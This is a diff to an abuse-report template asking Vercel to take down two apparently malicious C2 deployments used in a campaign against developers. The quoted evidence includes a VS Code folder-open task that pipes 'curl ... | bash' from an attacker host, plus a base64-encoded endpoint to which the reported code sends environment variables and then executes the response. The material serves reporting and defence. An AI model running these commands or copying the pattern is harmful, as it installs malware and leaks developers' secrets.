@@ -2,14 +2,22 @@
 
 **Submission target:** https://vercel.com/help — search "Report abuse" or use https://vercel.com/security/abuse if available; otherwise file a support ticket categorized as *abuse / DMCA / legal*.
 
-**How to use this file**
+This file is a **copy-paste template**. Most of it (the C2 hostnames, IPs, base64 AUTH_API value, list of affected GitHub repos, the reproducible probe) is campaign-wide and already filled in — these are the actual targets and indicators, the same for any filer in this cluster. The only bits you fill in are the URLs of *which* GitHub repo you cite as evidence of the C2 references, plus your name.
+
+### Placeholders to fill in
+
+| Placeholder | What to put | Where to find it |
+|---|---|---|
+| `<YOUR_REPO_URL>` | Full URL of a GitHub repo from the cluster you can cite as evidence, e.g. `https://github.com/<org>/<repo>` | The case file, or any of the cluster repos listed in the body |
+| `<COMMIT_SHA>` | The full 40-char commit SHA you can permalink against on that repo | `git log -1 --format=%H` on a local clone, or the head SHA on the GitHub page |
+| `<YOUR_NAME>` | Your name or handle for the "Reported by" line | (yourself) |
+
+The two C2 hostnames in this report serve **the entire ≥15-repo developer-targeting campaign** described in the companion GitHub abuse report; this filing is by nature cluster-wide, not specific to any single source repository.
 
 1. Copy the contents of the **Subject** code block below into the ticket's subject / title field.
 2. Copy the contents of the **Body** code block below into the ticket's description field. The body is written as plain text — it reads sensibly even though the support form doesn't render Markdown.
 
-The two C2 hostnames in this report serve **the entire ≥15-repo developer-targeting campaign** described in the companion GitHub abuse report; this filing is by nature cluster-wide, not specific to any single source repository.
-
-(On the rendered GitHub view of this file, hover over each code block to get GitHub's click-to-copy icon — you'll get the verbatim text, not the rendered version.)
+> On the rendered GitHub view of this file, hover over each `text` code block to get GitHub's click-to-copy icon — you'll get the verbatim text, not the rendered version. **Do the placeholder fill-in before pasting.**
 
 ---
 
@@ -49,14 +57,14 @@ EVIDENCE OF MALICIOUS USE -- referenced from malicious GitHub repositories
 The two C2 hostnames are referenced directly from the malicious repositories:
 
 - vscode-settings-0506.vercel.app is invoked from .vscode/tasks.json with runOn:folderOpen executing 'curl -L https://vscode-settings-0506.vercel.app/api/settings/mac | bash' and per-OS equivalents. Output is fully suppressed. See:
-    https://github.com/AjunaWorkHub/AjunaVerse_MVP/blob/bac3362000a9332a490c763feb847995ea412b46/.vscode/tasks.json
+    <YOUR_REPO_URL>/blob/<COMMIT_SHA>/.vscode/tasks.json
 
 - ip-core-api-one.vercel.app is committed in .env as the value of AUTH_API, base64-encoded:
     AUTH_API=aHR0cHM6Ly9pcC1jb3JlLWFwaS1vbmUudmVyY2VsLmFwcC9hcGk=
   which decodes to https://ip-core-api-one.vercel.app/api. The committed code at server/controllers/auth.js and server/routes/api/auth.js then POSTs process.env to this URL and new-Function-executes the response. See:
-    https://github.com/AjunaWorkHub/AjunaVerse_MVP/blob/bac3362000a9332a490c763feb847995ea412b46/.env
-    https://github.com/AjunaWorkHub/AjunaVerse_MVP/blob/bac3362000a9332a490c763feb847995ea412b46/server/controllers/auth.js
-    https://github.com/AjunaWorkHub/AjunaVerse_MVP/blob/bac3362000a9332a490c763feb847995ea412b46/server/routes/api/auth.js
+    <YOUR_REPO_URL>/blob/<COMMIT_SHA>/.env
+    <YOUR_REPO_URL>/blob/<COMMIT_SHA>/server/controllers/auth.js
+    <YOUR_REPO_URL>/blob/<COMMIT_SHA>/server/routes/api/auth.js
 
 
 EVIDENCE THE DEPLOYMENTS ARE OPERATING AS GATED C2 (not benign apps)
@@ -113,6 +121,11 @@ REQUESTED ACTIONS
 3. Search for sibling deployments under the naming patterns "vscode-settings-*.vercel.app" and "ip-core-api-*.vercel.app" from the same account. The "-0506" suffix is plausibly date-encoded, suggesting prior deployments at other dates; the "-one" suffix suggests "-two", "-three", etc.
 
 4. Preserve account / deployment / access-log records as forensic evidence prior to takedown. The access logs would identify the operator's IPs (used for deployment management), and the request logs would identify the set of victim IPs that have been registered on the allowlist gate.
+
+
+REPORTED BY
+
+<YOUR_NAME>
 ```
 
 ---
